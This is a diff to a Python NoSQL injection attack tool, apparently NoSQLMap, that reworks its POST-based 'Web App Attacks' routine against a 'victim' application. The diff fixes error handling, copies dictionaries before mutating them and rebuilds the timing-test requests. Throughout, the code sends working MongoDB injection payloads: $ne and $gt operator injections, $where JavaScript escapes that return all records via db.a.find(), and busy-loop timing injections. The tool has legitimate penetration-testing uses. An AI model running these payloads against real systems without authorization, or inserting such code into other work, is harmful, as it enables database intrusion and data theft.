@@ -390,7 +390,6 @@ def getResponseBodyHandlingErrors(req):
     
     return responseBody
 
-
 def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None):
     print("Web App Attacks (POST)")
     print("===============")
@@ -424,7 +423,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
     try:
         body = urllib.parse.urlencode(postData).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         appRespCode = urllib.request.urlopen(req).getcode()
 
         if appRespCode == 200:
@@ -446,9 +445,23 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Got " + str(appRespCode) + "from the app, check your options.")
 
-    except NoSQLMapException as e:
+    except urllib.error.HTTPError as e:
+        print("Got HTTP error " + str(e.code) + ": " + str(e.reason))
+        print("The application may still be testable. Continue? (y/n): ", end='')
+        cont = input()
+        if cont.lower() == 'y':
+            appUp = True
+            normLength = 0
+        else:
+            if args == None:
+                input("Press enter to continue...")
+            return
+    except Exception as e:
         print(e)
         print("Looks like the server didn't respond.  Check your options.")
+        if args == None:
+            input("Press enter to continue...")
+        return
 
     if appUp == True:
 
@@ -465,7 +478,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
                 injIndex = int(args.injectedParameter)
             injOpt = str(list(postData.keys())[int(injIndex)-1])
             print("Injecting the " + injOpt + " parameter...")
-        except NoSQLMapException:
+        except:
             if args == None:
                 input("Something went wrong.  Press enter to return to the main menu...")
             return
@@ -486,7 +499,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
         injectSize = int(injectSize)
         injectString = build_random_string(format, injectSize)
-                
+
         print("Using " + injectString + " for injection testing.\n")
 
         # Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
@@ -498,7 +511,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Sending random parameter value...")
 
         body = urllib.parse.urlencode(postData).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         randLength = int(len(getResponseBodyHandlingErrors(req)))
         print("Got response length of " + str(randLength) + ".")
 
@@ -510,13 +523,13 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Random value variance: " + str(randNormDelta) + "\n")
 
         # Generate not equals injection
-        neDict = postData
+        neDict = postData.copy()
         neDict[injOpt + "[$ne]"] = neDict[injOpt]
         del neDict[injOpt]
         body = urllib.parse.urlencode(neDict).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
-            print("Testing Mongo PHP not equals associative array injection using " + str(postData) +"...")
+            print("Testing Mongo PHP not equals associative array injection using " + str(neDict) +"...")
 
         else:
             print("Test 1: PHP/ExpressJS != associative array injection")
@@ -533,17 +546,18 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         print("\n")
 
         # Delete the extra key
-        del postData[injOpt + "[$ne]"]
+        if injOpt + "[$ne]" in postData:
+            del postData[injOpt + "[$ne]"]
 
         # generate $gt injection
-        gtDict = postData
+        gtDict = postData.copy()
         gtDict.update({injOpt:""})
         gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
         del gtDict[injOpt]
         body = urllib.parse.urlencode(gtDict).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
-            print("Testing PHP/ExpressJS >Undefined Injection using " + str(postData) + "...")
+            print("Testing PHP/ExpressJS >Undefined Injection using " + str(gtDict) + "...")
 
         else:
             print("Test 2:  PHP/ExpressJS > Undefined Injection")
@@ -557,7 +571,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
         postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
         body = urllib.parse.urlencode(postData).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print("Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n")
             print("Injecting " + str(postData))
@@ -578,7 +592,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
         postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
         body = urllib.parse.urlencode(postData).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print("Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n")
             print("Injecting " + str(postData))
@@ -598,7 +612,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         # Start a single record attack in case the app expects only one record back
         postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
         body = urllib.parse.urlencode(postData).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print("Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n")
             print(" Injecting " + str(postData))
@@ -619,7 +633,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
         postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
         body = urllib.parse.urlencode(postData).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print("Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n")
             print(" Injecting " + str(postData))
@@ -640,7 +654,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
         postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
         body = urllib.parse.urlencode(postData).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
 
         if verb == "ON":
             print("Testing Mongo this not equals string escape attack for all records...")
@@ -661,7 +675,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
         postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
         body = urllib.parse.urlencode(postData).encode('utf-8')
-        req = urllib.request.Request(appURL,body, requestHeaders)
+        req = urllib.request.Request(appURL, body, requestHeaders)
 
         if verb == "ON":
             print("Testing Mongo this not equals integer escape attack for all records...")
@@ -681,22 +695,18 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         print("\n")
 
         doTimeAttack = "N"
-        if args == None:        
+        if args == None:
             doTimeAttack = input("Start timing based tests (y/n)? ")
 
         if doTimeAttack == "y" or doTimeAttack == "Y":
             print("Starting Javascript string escape time based injection...")
             postData.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()/1000 < 10); return true; var dummy='a"})
             body = urllib.parse.urlencode(postData).encode('utf-8')
-            conn = urllib.request.urlopen(req,body)
+            req = urllib.request.Request(appURL, body, requestHeaders)
             start = time.time()
-            page = conn.read()
+            page = getResponseBodyHandlingErrors(req)
             end = time.time()
-            conn.close()
-            print(str(end))
-            print(str(start))
             strTimeDelta = (int(round((end - start), 3)) - timeBase)
-            #print str(strTimeDelta)
             if strTimeDelta > 25:
                 print("HTTP load time variance was " + str(strTimeDelta) +"  seconds! Injection possible.")
                 strTbAttack = True
@@ -709,15 +719,11 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
             postData.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()/1000 < 10); return; var dummy=1"})
             body = urllib.parse.urlencode(postData).encode('utf-8')
+            req = urllib.request.Request(appURL, body, requestHeaders)
             start = time.time()
-            conn = urllib.request.urlopen(req,body)
-            page = conn.read()
+            page = getResponseBodyHandlingErrors(req)
             end = time.time()
-            conn.close()
-            print(str(end))
-            print(str(start))
             intTimeDelta = ((end-start) - timeBase)
-            #print str(strTimeDelta)
             if intTimeDelta > 25:
                 print("HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible.")
                 intTbAttack = True
@@ -759,13 +765,16 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         input("Press enter to continue...")
     return()
 
-
 def errorTest (errorCheck,testNum):
     global possAddrs
     global httpMethod
     global neDict
     global gtDict
     global postData
+
+    # Convert bytes to string if needed
+    if isinstance(errorCheck, bytes):
+        errorCheck = errorCheck.decode('utf-8', errors='ignore')
 
     if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
         print("Injection returned a MongoDB Error.  Injection may be possible.")
@@ -788,8 +797,6 @@ def errorTest (errorCheck,testNum):
                 return True
     else:
         return False
-
-
 
 def checkResult(baseSize,respSize,testNum,verb,postData):
     global vulnAddrs
